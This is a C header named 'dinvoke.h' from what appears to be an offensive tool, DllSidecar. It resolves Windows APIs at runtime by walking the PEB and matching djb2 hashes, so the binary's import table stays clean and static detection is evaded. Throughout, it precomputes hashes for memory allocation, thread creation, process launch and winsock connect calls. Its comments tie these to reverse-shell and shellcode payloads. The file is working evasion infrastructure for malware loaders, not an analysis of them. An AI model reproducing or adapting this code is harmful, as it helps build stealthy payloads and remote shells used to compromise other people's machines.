/*
 * DllSidecar — dinvoke.h
 * Dynamic API resolution via PEB walking + djb2 hashing.
 * No static imports — IAT stays clean.
 *
 * @tunelko — BugAInters 2026
 */

#ifndef DINVOKE_H
#define DINVOKE_H

#include <windows.h>
#include <stddef.h>

/* ── PEB structures (manually defined to avoid winternl.h import) ── */

typedef struct _SC_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} SC_UNICODE_STRING;

typedef struct _SC_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    SC_UNICODE_STRING FullDllName;
    SC_UNICODE_STRING BaseDllName;
} SC_LDR_DATA_TABLE_ENTRY;

typedef struct _SC_PEB_LDR_DATA {
    ULONG      Length;
    BOOLEAN    Initialized;
    HANDLE     SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} SC_PEB_LDR_DATA;

typedef struct _SC_PEB {
    BOOLEAN           InheritedAddressSpace;
    BOOLEAN           ReadImageFileExecOptions;
    BOOLEAN           BeingDebugged;
    BOOLEAN           SpareBool;
    HANDLE            Mutant;
    PVOID             ImageBaseAddress;
    SC_PEB_LDR_DATA  *Ldr;
} SC_PEB;

/* ── Hash function: djb2 (case-sensitive, for API names) ── */

static inline unsigned long djb2_hash(const char *str) {
    unsigned long h = 5381;
    int c;
    while ((c = *str++))
        h = ((h << 5) + h) + (unsigned long)c;
    return h;
}

/* ── Hash function: djb2 case-insensitive (for module names) ── */

static inline unsigned long djb2_hash_i(const char *str) {
    unsigned long h = 5381;
    int c;
    while ((c = *str++)) {
        if (c >= 'A' && c <= 'Z') c += 0x20;
        h = ((h << 5) + h) + (unsigned long)c;
    }
    return h;
}

/* ── Wide-char djb2 case-insensitive (for PEB module names) ── */

static inline unsigned long djb2_hash_wi(const WCHAR *str, int len) {
    unsigned long h = 5381;
    for (int i = 0; i < len; i++) {
        int c = (int)str[i];
        if (c >= 'A' && c <= 'Z') c += 0x20;
        h = ((h << 5) + h) + (unsigned long)c;
    }
    return h;
}

/* ── PEB access (GCC inline asm, works with MinGW) ── */

static inline SC_PEB *get_peb(void) {
    SC_PEB *peb;
#ifdef _WIN64
    __asm__ volatile ("mov %%gs:0x60, %0" : "=r"(peb));
#else
    __asm__ volatile ("mov %%fs:0x30, %0" : "=r"(peb));
#endif
    return peb;
}

/* ── Find loaded module base address by hash ── */

static PVOID dinvoke_get_module(unsigned long module_hash) {
    SC_PEB *peb = get_peb();
    if (!peb || !peb->Ldr) return NULL;

    LIST_ENTRY *head = &peb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY *entry = head->Flink;

    while (entry != head) {
        SC_LDR_DATA_TABLE_ENTRY *mod = (SC_LDR_DATA_TABLE_ENTRY *)
            ((BYTE *)entry - offsetof(SC_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));

        if (mod->BaseDllName.Buffer && mod->BaseDllName.Length > 0) {
            unsigned long h = djb2_hash_wi(
                mod->BaseDllName.Buffer,
                mod->BaseDllName.Length / sizeof(WCHAR));
            if (h == module_hash)
                return mod->DllBase;
        }
        entry = entry->Flink;
    }
    return NULL;
}

/* ── Resolve export by hash from module PE export table ── */

static FARPROC dinvoke_get_proc(PVOID module_base, unsigned long func_hash) {
    if (!module_base) return NULL;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)module_base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)((BYTE *)module_base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD export_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD export_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!export_rva) return NULL;

    IMAGE_EXPORT_DIRECTORY *exports = (IMAGE_EXPORT_DIRECTORY *)((BYTE *)module_base + export_rva);

    DWORD *names     = (DWORD *)((BYTE *)module_base + exports->AddressOfNames);
    WORD  *ordinals  = (WORD  *)((BYTE *)module_base + exports->AddressOfNameOrdinals);
    DWORD *functions = (DWORD *)((BYTE *)module_base + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char *name = (char *)((BYTE *)module_base + names[i]);
        if (djb2_hash(name) == func_hash) {
            DWORD func_rva = functions[ordinals[i]];
            FARPROC addr = (FARPROC)((BYTE *)module_base + func_rva);

            /* Handle forwarded exports: RVA points inside export directory */
            if (func_rva >= export_rva && func_rva < export_rva + export_size) {
                /* Forwarded — format: "module.function" */
                /* Not resolved here; caller should handle if needed */
                return NULL;
            }
            return addr;
        }
    }
    return NULL;
}

/* ── Resolve export by name string (fallback for non-hashed lookups) ── */

static FARPROC dinvoke_get_proc_by_name(PVOID module_base, const char *func_name) {
    return dinvoke_get_proc(module_base, djb2_hash(func_name));
}

/* ── Convenience macro: resolve API with one call ── */

#define DINVOKE(mod_hash, func_hash, type) \
    ((type)dinvoke_get_proc(dinvoke_get_module(mod_hash), func_hash))

/* ── Pre-computed module hashes (djb2 case-insensitive) ── */
/* Use generator/sidecar.py --hash <name> to compute new ones  */

#define H_KERNEL32_DLL   0x7040EE75UL  /* kernel32.dll */
#define H_NTDLL_DLL      0x22D3B5EDUL  /* ntdll.dll    */
#define H_USER32_DLL     0x5A6BD3F3UL  /* user32.dll   */
#define H_ADVAPI32_DLL   0x67208A49UL  /* advapi32.dll */
#define H_WS2_32_DLL     0x9AD10B0FUL  /* ws2_32.dll — reverse-shell payload */

/* ── Pre-computed API hashes (djb2 case-sensitive) ── */

#define H_LOADLIBRARYA      0x5FBFF0FBUL  /* LoadLibraryA      */
#define H_GETPROCADDRESS    0xCF31BB1FUL  /* GetProcAddress    */
#define H_VIRTUALALLOC      0x382C0F97UL  /* VirtualAlloc      */
#define H_VIRTUALPROTECT    0x844FF18DUL  /* VirtualProtect    */
#define H_CREATETHREAD      0x7F08F451UL  /* CreateThread      */
#define H_CLOSEHANDLE       0x3870CA07UL  /* CloseHandle       */
#define H_CREATEFILEA       0xEB96C5FAUL  /* CreateFileA       */
#define H_WRITEFILE         0x663CECB0UL  /* WriteFile         */
#define H_GETTEMPPATHA      0x9EF979E9UL  /* GetTempPathA      */
#define H_MESSAGEBOXA       0x384F14B4UL  /* MessageBoxA       */
#define H_WINEXEC           0x29A65678UL  /* WinExec           */
#define H_SLEEP             0x0E19E5FEUL  /* Sleep             */
#define H_EXITTHREAD        0x7ACB5457UL  /* ExitThread        */
#define H_CREATEPROCESSA    0xAEB52E19UL  /* CreateProcessA — child-process payloads */
#define H_WSASTARTUP        0x6128C683UL  /* WSAStartup    — ws2_32 */
#define H_WSASOCKETW        0x559F15B0UL  /* WSASocketW    — ws2_32 */
#define H_CONNECT           0xD3764DCFUL  /* connect       — ws2_32 */
#define H_CLOSESOCKET       0x494CB104UL  /* closesocket   — ws2_32 */

/* ── DInvoke-resolved API typedefs ── */

typedef HMODULE (WINAPI *fn_LoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *fn_GetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID  (WINAPI *fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE  (WINAPI *fn_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,
                    LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL    (WINAPI *fn_CloseHandle)(HANDLE);
typedef HANDLE  (WINAPI *fn_CreateFileA)(LPCSTR, DWORD, DWORD,
                    LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL    (WINAPI *fn_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef DWORD   (WINAPI *fn_GetTempPathA)(DWORD, LPSTR);
typedef int     (WINAPI *fn_MessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);
typedef UINT    (WINAPI *fn_WinExec)(LPCSTR, UINT);
typedef void    (WINAPI *fn_Sleep)(DWORD);
typedef void    (WINAPI *fn_ExitThread)(DWORD);

/* CreateProcessA — no winsock dependency, always available. */
typedef BOOL    (WINAPI *fn_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES,
                    LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR,
                    LPSTARTUPINFOA, LPPROCESS_INFORMATION);

/* WS2_32 typedefs — gated on <winsock2.h> having been included first.
 * The reverse-shell payload pulls winsock2 before this header, so the gate
 * fires and the typedefs become visible. Other payloads (MessageBox, Shellcode,
 * etc.) never include winsock2, so these stay invisible and don't pollute the
 * symbol space with WS2 types. */
#ifdef _WINSOCK2API_
typedef int     (WINAPI *fn_WSAStartup)(WORD, LPWSADATA);
typedef SOCKET  (WINAPI *fn_WSASocketW)(int, int, int, LPVOID, GROUP, DWORD);
typedef int     (WINAPI *fn_connect)(SOCKET, const struct sockaddr*, int);
typedef int     (WINAPI *fn_closesocket)(SOCKET);
#endif /* _WINSOCK2API_ */

/* ── Cached API resolver (resolves once, caches in static vars) ── */

static fn_LoadLibraryA   p_LoadLibraryA   = NULL;
static fn_GetProcAddress p_GetProcAddress = NULL;

static void dinvoke_init_core(void) {
    if (p_LoadLibraryA) return;
    p_LoadLibraryA   = DINVOKE(H_KERNEL32_DLL, H_LOADLIBRARYA,   fn_LoadLibraryA);
    p_GetProcAddress = DINVOKE(H_KERNEL32_DLL, H_GETPROCADDRESS, fn_GetProcAddress);
}

/* ── Load a module by encrypted/decrypted name via DInvoke ── */

static HMODULE dinvoke_load_module(const char *name) {
    dinvoke_init_core();
    if (!p_LoadLibraryA) return NULL;
    return p_LoadLibraryA(name);
}

/* ── Resolve a function from a loaded module via DInvoke ── */

static FARPROC dinvoke_resolve(HMODULE hmod, const char *name) {
    dinvoke_init_core();
    if (!p_GetProcAddress) return NULL;
    return p_GetProcAddress(hmod, name);
}

#endif /* DINVOKE_H */
